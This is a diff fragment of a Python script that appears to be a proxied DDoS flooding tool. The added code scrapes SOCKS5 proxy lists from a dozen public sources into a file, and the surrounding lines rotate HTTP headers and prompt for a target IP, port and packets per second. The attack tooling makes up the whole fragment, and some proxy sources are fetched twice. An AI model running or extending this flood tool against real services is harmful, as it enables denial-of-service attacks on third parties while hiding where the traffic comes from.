@@ -152,6 +152,67 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
            "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"]
 
+        r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("http://worm.rip/socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://api.openproxylist.xyz/socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
+        f.write(r.content)
+        f.close()
+    except:
+        f.close()
+
 ip = str(input('[+] Target: '))
 port = int(input('[+] Port: '))
 pack = int(input('[+] Packet/s: '))
